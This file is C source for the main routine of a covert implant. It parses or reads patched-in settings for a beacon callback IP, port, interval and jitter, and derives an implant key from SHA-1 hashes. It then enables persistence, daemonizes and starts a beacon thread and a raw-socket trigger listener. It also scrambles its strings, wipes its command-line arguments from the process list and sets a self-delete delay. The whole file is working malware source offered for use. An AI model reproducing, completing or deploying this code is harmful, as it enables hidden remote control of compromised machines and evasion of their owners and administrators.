#include <stddef.h>
#include "compat.h"
 
#define _USE_32BIT_TIME_T
#define _INC_STAT_INL
#include <sys/types.h>
#include <sys/stat.h>
#include <limits.h>
 
//String encoding handled via the next 3 included files...
#include "proj_strings_main.h"
#include "string_utils.h"
#include "function_strings.h"
#include "debug.h"
#include "trigger_listen.h"
#include "beacon.h"
#include "persistence.h"
#include "getopt.h"
#include "daemonize.h"
#include "self_delete.h"
#include "threads.h"
#include "run_command.h"
#include "trigger_payload.h"
#include "polarssl/sha1.h"
 
 
//PolarSSL Files
#include "polarssl/include/polarssl/config.h"
#include "polarssl/include/polarssl/sha1.h"
 
#ifndef _SRANDFLAG_
#define _SRANDFLAG_
#include <time.h>
int initSrandFlag = 0;       //Used as a flag to ensure srand is initialized only once...
#endif
 
#include <signal.h>
#include <unistd.h>
#define _stat stat
 
//const char* OPT_STRING  = (char*) cIures4j;
const char* ohshsmdlas3r  = (char*) cIures4j;
 
// from polarssl/net.c
extern int wsa_init_done;
 
// Global
unsigned char	ikey[ID_KEY_HASH_SIZE];		// Implant Key
 
#ifdef DEBUG
int dbug_level_ = 2;				// debug level
#endif
 
//**************************************************************
struct cl_args
{
	unsigned int	sig;
	unsigned int	beacon_port;
	unsigned int	host_len;
	char		beacon_ip[256];
	char		iface[16];
	unsigned char   idKey[ID_KEY_HASH_SIZE];
	unsigned long	init_delay;
	unsigned int	interval;
	unsigned int	trigger_delay;
	unsigned int	jitter;
	unsigned long	delete_delay;
	unsigned int	patched;
};
 
#define SIG_HEAD	0x7AD8CFB6
 
struct cl_args		args = { SIG_HEAD, 0, 0, {0}, {0}, {0}, 0, 0, 0, 0, 0, 0 };
 
//**************************************************************
D (
static void printUsage(char* exeName)
{
	printf("\n\tUsage:\n\n");
	printf("\t%s -a <address> -i <interval>\n\n", exeName);
	printf("\t\t-a <address>           - beacon IP address to callback to\n");
	printf("\t\t-p <port>              - beacon port (default: 443)\n");
	printf("\t\t-i <interval>          - beacon interval in seconds\n");
	printf("\t\t-k <id key>            - implant key phrase\n");
	printf("\t\t-K <id key>            - implant key file\n");
	printf("\t\t-j <jitter>            - integer for percent jitter (0 <= jitter <= 30, default: 3 )\n");
#ifdef SOLARIS
	printf("\t\t-I <interface>         - interface on which to listen\n");
#endif
	printf("\t\t-d <beacon delay>      - initial beacon delay (in seconds, default: 2 minutes)\n");
	printf("\t\t-t <callback delay>    - delay between trigger received and callback +/- 30 seconds (in seconds)\n");
	printf("\t\t-s <self-delete delay> - since last successful trigger/beacon (in seconds, default: 60 days)\n");
	printf("\n\t\t-D <debug level>     - debug level between 1 and 9, higher numbers are more verbose\n");
	printf("\t\t-h                     - print this help menu\n");
 
	printf( "\n\tExample:\n" );
	printf( "\t\t./aincradd-solaris-sparc-dbg -a 10.3.2.76 -p 9999 -i 100000 -I hme0 -k Testing \n" );
	printf("\n");
	return;
}
)
 
//**************************************************************
static int is_elevated_permissions( void );
static void clean_args( int argc, char *argv[], char *new_argv0 );
static void * asloc( char *string );
 
 
 
//**************************************************************
int main(int argc, char** argv)
{
	int		c = 0;
	char		*beaconIP = NULL;
	char		*szInterface = NULL;
	int		beaconPort = DEFAULT_BEACON_PORT;
	unsigned long	initialDelay = DEFAULT_INITIAL_DELAY;
	int		interval = DEFAULT_BEACON_INTERVAL;
	int		trigger_delay = DEFAULT_TRIGGER_DELAY;
	unsigned long	delete_delay = SELF_DEL_TIMEOUT;
	float		jitter = DEFAULT_BEACON_JITTER * 0.01f;
	int		retVal = 0;
	FILE		*f;
	struct stat st;
#ifndef DEBUG
	int		status = 0;
#endif
 
 
 
#if defined SOLARIS
	int exe_path_size = 256;
#endif
 
 	ikey[0] = '\0';
 
	init_strings(); 	// De-scramble strings
 
	// Check to see if we have sufficient root/admin permissions to continue.
	// root/admin permissions required for RAW sockets and [on windows] discovering
	// MAC address of ethernet interface(s)
	if ( is_elevated_permissions() != SUCCESS )
	{
		fprintf(stderr,"%s", inp183Aq );
		return -1;
	}
 
	//initialize srand only once using the initSrandFlag...
    if (!initSrandFlag)
    {
        srand((unsigned int)time(NULL));
        initSrandFlag = 1;
    }
 
	if(stat( (char *)sdfp,&st ) != 0)
	{
		DLX(1, perror( " stat()" ));
		DLX(1, printf(" %s file does not exist\n", (char *)sdfp));
 
		f = fopen( (char *)sdfp,"w" );
 
		if ( f == NULL )
		{
			DLX(1, perror(" fopen()"));
			DLX(1, printf("\tCould not create file %s\n", (char *)sdfp));
			exit( 0 );
		}
 
		fclose(f);
	}
	else
	{
		DLX(1, printf( "\t%s file already exists\n", (char *)sdfp ));
	}
 
#if defined SOLARIS
	memset(exe_path,0,exe_path_size);
//	retVal = run_command("pwd", exe_path, &exe_path_size);
//	if(retVal != 0)
	if ( getcwd( exe_path, exe_path_size ) == NULL )
	{
		DLX(1, perror("getcwd()"));
		DLX(1,printf("\tERROR: exe path returned too long for the buffer\n"));
	}
	else
	{
		//strip off new line
		DLX(1,printf( "exec_path (pwd, cwd) is %s\n", exe_path));
//		memset(strstr(exe_path,"\n"),0, 1);
	}
#endif
 
	//To See Crypto Keys, ENABLE THIS SECTION with debug level 4...
#if 0
	DLX(4,
		printf("\n\n my_dhm_P_String=%s ", my_dhm_P_String);
		printf("\n\n my_dhm_G_String=%s ", my_dhm_G_String);
		printf("\n\n test_ca_crt_String=%s ", test_ca_crt_String);
		printf("\n\n test_srv_crt_String=%s ", test_srv_crt_String);
		printf("\n\n test_srv_key_String=%s ", test_srv_key_String)
	);
#endif
 
	if ( args.patched == 1 )
	{
		// binary was patched
		// all patched times should be already be in milliseconds
		DLX(1, printf("Binary was patched with arguments\n"));
 
		beaconPort = args.beacon_port;
		beaconIP = args.beacon_ip;
		szInterface = args.iface;
		initialDelay = args.init_delay;
		interval = args.interval;
		memcpy(ikey, args.idKey, ID_KEY_HASH_SIZE * sizeof(unsigned char));
		trigger_delay = args.trigger_delay;
		delete_delay = args.delete_delay;
		jitter = args.jitter * 0.01f;
 
	//	cl_string( (unsigned char *)args.beacon_ip, sizeof( args.beacon_ip ) );
		cl_string( (unsigned char *)args.beacon_ip, args.host_len );
		beaconIP[ args.host_len ] = '\0';
		DLX(1, printf("\tDecoded patched value for hostname/IP: %s\n", beaconIP));
 
		cl_string( (unsigned char *)args.iface, sizeof( args.iface ) );
		DLX(1, printf( "\tDecoded patched value for interface: %s\n", szInterface));
 
		goto okay;
	}
	DLX(1, printf("NOTE: Binary was NOT/NOT patched with arguments\n\n"));
 
	// process options
	//while(EOF != (c = getopt(argc, argv, OPT_STRING)))
#ifdef DEBUG
	while((c = getopt(argc, argv, "a:cD:d:hI:i:j:K:k:p:s:t:")) != -1)
#else
	while((c = getopt(argc, argv, ohshsmdlas3r)) != -1)
#endif
	{
		switch(c)
		{
			case 'a':
				// todo: check that IP address is valid -- see client for howto
				beaconIP = asloc( optarg );//optarg;
				break;
 
#ifdef DEBUG
			case 'D':
				dbug_level_ = atoi(optarg);
				break;
#endif
 
			case 'd':
				// user enters delay in seconds and this is converted to milliseconds
				// If set to 0, this will disable all beacons...
				initialDelay = atoi(optarg) * 1000;
				break;
 
			case 'I':
				// TODO: new option. what validation is needed?
				szInterface = asloc( optarg );
				break;
 
			case 'i':
				// user enters delay in seconds and this is converted to milliseconds
				interval = atoi(optarg) * 1000;
				break;
 
			case 'j':
				if ( ( atoi(optarg) >= 0 ) && ( atoi(optarg) <= 30 ) )
				{
					jitter = atoi(optarg) * 0.01f;
				}
				else
				{
					jitter=-1;
				}
				break;
 
			case 'K':
				{	struct stat	statbuf;
 
					if (ikey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
//						fprintf(stderr, "Option error\n");
						fprintf(stderr, "%s\n", oe1);
						return -1;
					}
 
					if (access(optarg, R_OK)) {
						fprintf( stderr, "%s\n", oe2);
						return -1;
					}
					if (stat(optarg, &statbuf) != 0) {
						perror("Option K");
						return -1;
					}
					if (statbuf.st_size >= ID_KEY_LENGTH_MIN) { // Validate that the key text is of sufficient length
						sha1_file((const char *)optarg, ikey);		// Generate the ID key
						DLX(1, displaySha1Hash ("Trigger Key", ikey));
						sha1(ikey, ID_KEY_HASH_SIZE, ikey);		// Generate the implant key
						DLX(1, displaySha1Hash ("Implant Key", ikey));
						DLX(1, printf("\n\n\n" ));
					} else {
						fprintf(stderr, "%s\n", oe3);
						return -1;
					}
					break;
				}
 
			case 'k':
				// The implant key is generated from the SHA-1 hash of the SHA-1 hash of the
				// text entered on the command line or by reading the key file.
 
				if (ikey[0] != '\0') {	// Ensure that both -k and -K options aren't used together.
//					fprintf(stderr, "%s\n" "Option error");
					fprintf(stderr, "%s\n", oe1);
					return -1;
				}
 
                                if ( strlen( optarg ) < ID_KEY_LENGTH_MIN ) {
					fprintf(stderr, "%s\n", oe3);
            				return -1;
                                }
				DLX(1, printf( "KeyPhrase: %s \n", optarg));
				sha1((const unsigned char *)optarg, strlen(optarg), ikey);
				DLX(1, displaySha1Hash ("Trigger Key", ikey));
				sha1(ikey, ID_KEY_HASH_SIZE, ikey);
				DLX(1, displaySha1Hash ("Implant Key", ikey));
				DLX(1, printf("\n\n\n"));
				break;
 
			case 'p':
				beaconPort = atoi(optarg);
				break;
 
			case 's':
				// user enters self delete delay in seconds, this is NOT converted to milliseconds since Sleep is not used...
				//delete_delay = atoi(optarg);
				delete_delay =  strtoul( optarg, NULL, 10);
				break;
 
			case 't':
				// user enters delay in seconds and this is converted to milliseconds
				trigger_delay = atoi(optarg) * 1000;
				break;
 
			default:
				DLX(1, printUsage(argv[0]));
				exit(0);
				break;
		}
	}
 
	// process environment variables, if needed
 
	//validate user input
	//Make sure the beacon's port is specified
	if(beaconPort == -1)
	{
		D( printf("No Beacon Port Specified! \n"); )
		D( printUsage(argv[0]); )
		return 0;
	}
 
	//Make sure the IP for the beacon to send to is specified
	if(beaconIP == NULL)
	{
		D( printf("No Beacon IP address specified! \n"); )
		D( printUsage(argv[0]); )
		return 0;
	}
 
	if ( initialDelay > 0 && interval == 0 )
	{
		D( printf("No Beacon Interval specified!\n"); )
		D( printUsage(argv[0]); )
		return 0;
	}
 
	if  ( initialDelay >= (INT_MAX-1) ) 
	{
		D( printUsage(argv[0]); )
		return 0;
	}
 
	//Make sure the jitter is non zero
	if ( jitter == -1 )
	{
		D( printUsage(argv[0]); )
		return 0;
	}
 
	if (ikey[0] == '\0')
	{
		D( printUsage(argv[0]); )
		return 0;
	}
 
#ifdef SOLARIS
// SOLARIS raw socket implementation requires that we specify the specific interface to sniff
	if ( !szInterface )
	{
		D( printf("\nYou must use the -I option for Solaris, this will abort shortly... \n\n"); )
		D( printUsage(argv[0]); )
		return -1;
	}
#endif
 
	// for Linux and Solaris, zeroize command line arguments
	clean_args( argc, argv, NULL );	
 
// if the binary has been patched, we don't need to parse command line arguments
okay:
 
	if ( args.patched == 1 )
	{
		retVal = EnablePersistence(beaconIP,beaconPort);
		if( 0 > retVal)
		{
			DLX(1, printf("\nCould not enable Persistence!\n"));
			return -1;
		}
	}
 
#ifndef DEBUG
	status = daemonize();	// for linux and solaris
 
	if ( status != 0 )
	{
		//parent or error should exit
		exit(0);
	}
#endif
 
	if ( initialDelay > 0 )
	{
		// create beacon thread
		DLX(1, printf( "Calling BeaconStart()\n"));
		retVal = beacon_start(beaconIP, beaconPort, initialDelay, interval, jitter);
 
		if(0 != retVal)
		{
			DLX(1, printf("Beacon Failed to Start!\n"));
		}
	}
	else
	{
		DLX(1, printf("ALL BEACONS DISABLED, initialDelay <= 0.\n"));
	}
 
	// delete_delay
	DLX(1, printf("Self delete delay: %lu.\n", delete_delay ));
 
#ifndef __VALGRIND__
	DLX(2, printf( "\tCalling TriggerListen()\n" ));
	(void)TriggerListen( szInterface, trigger_delay, delete_delay );	//TODO: TriggerListen() doesn't return a meaningful value.
#endif
 
    return 0;
}
 
//****************************************************************************
// used to copy argv[] elements out so they can be zeriozed, if permitted by the OS
// Most helpful for unix-like systems and their process lists
static void * asloc( char *string )
{
    void    *ptr;
    int     len = strlen( string ) + 1;
 
    ptr = malloc( len + 1 );
 
    if ( ptr == NULL ) exit( -1 );
 
    memcpy( ptr, string, len );
 
    return ptr;
}
 
//****************************************************************************
/*!
	\brief	Checks to see if process is running with elevated privileges.
 
	This function check if the running process has effective root privileges on Solaris and Linux;
	or Administrator privileges on Windows.
 
	\param messsage            A pointer to the message the CRC should be calculated on.
	\param size                The number of bytes (uint8_t) in the message.    
 
	\return		success or failure
	\retval     zero if true
*/
 
static int is_elevated_permissions( void )
{
	// geteuid() returns the effective user ID of the calling process
	// if root, geteuid() will return 0
	return ( geteuid() ? FAILURE : SUCCESS );
}
 
#if defined LINUX
//****************************************************************************
static void clean_args( int argc, char **argv, char *new_argv0 )
{
    unsigned int	maxlen_argv0 = 0;
	unsigned int	len = 0;
    int				n;
 
	DLX(3, printf("\tLINUX => Attempting to clean command line arguments\n"));
 
    for ( n = ( argc - 1 ); n > 0; n-- )
    {
	len = strlen( *(argv + n) );
	DLX(3, printf( "\tCleaning argument #%d with length %d: %s\n", n, len, *(argv + n) ));
        memset( *(argv + n), 0, len );
        maxlen_argv0 += len;
    }
 
	DLX(3, printf( "\tMax ARGV0 length is %d bytes\n", maxlen_argv0 ));
 
    if ( ( new_argv0 != NULL ) && ( strlen( new_argv0 ) < maxlen_argv0 ) )
    {
        memset( *argv, 0, maxlen_argv0 );
        strcpy( *argv, new_argv0 );
    }
 
    return;
}
#elif defined SOLARIS
//****************************************************************************
static void clean_args( int argc, char **argv, char *new_argv0 )
{
	// to silence compiler warnings
	argc = argc;
	argv = argv;
	new_argv0 = new_argv0;
 
	return;
}
#endif